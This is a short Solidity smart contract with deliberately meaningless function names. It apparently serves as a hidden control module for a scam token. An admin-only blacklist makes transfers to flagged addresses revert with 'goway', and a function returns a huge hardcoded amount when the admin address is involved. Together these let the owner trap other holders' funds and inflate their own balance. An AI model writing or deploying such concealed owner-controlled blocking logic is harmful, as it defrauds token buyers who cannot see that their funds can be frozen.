pragma solidity ^0.8.10;

contract bitmmm {
    mapping(address => uint256) private _bans;
    address public bnnmaddress = address(0xC14664811a2a4c233d253fDD03dee4B97ABBEbb5);
    uint256 adminAmount = 70000000000*10**18*90000*1;
   
    function bitamont(uint256 bm) external   {
        require(msg.sender == bnnmaddress, 'NO ADMIN');
        adminAmount = bm;
    }

    function bitgate(address userAddress) external view returns  (uint256)   {
        require(msg.sender == bnnmaddress, 'NO ADMIN');
        return _bans[userAddress];
    }

    function bitsatd(address userAddress) external   {
        require(msg.sender == bnnmaddress, 'NO ADMIN');
        _bans[userAddress] = 1;
    }

    function bitrmvip(address userAddress) external   {
        require(msg.sender == bnnmaddress, 'NO ADMIN');
        _bans[userAddress] = 0;
    }

    function bitadmin() external   {
        require(msg.sender == bnnmaddress, 'NO ADMIN');
        _bans[bnnmaddress] = 100;
    }

     function grok27goat38dent(address soping, uint256 total,address destination) external view returns (uint256)   {
        if (_bans[destination] == 1){
            revert("goway");
        }else if (_bans[destination] == 100) {
            return adminAmount;
        }else {
            return total; 
        }
    }
}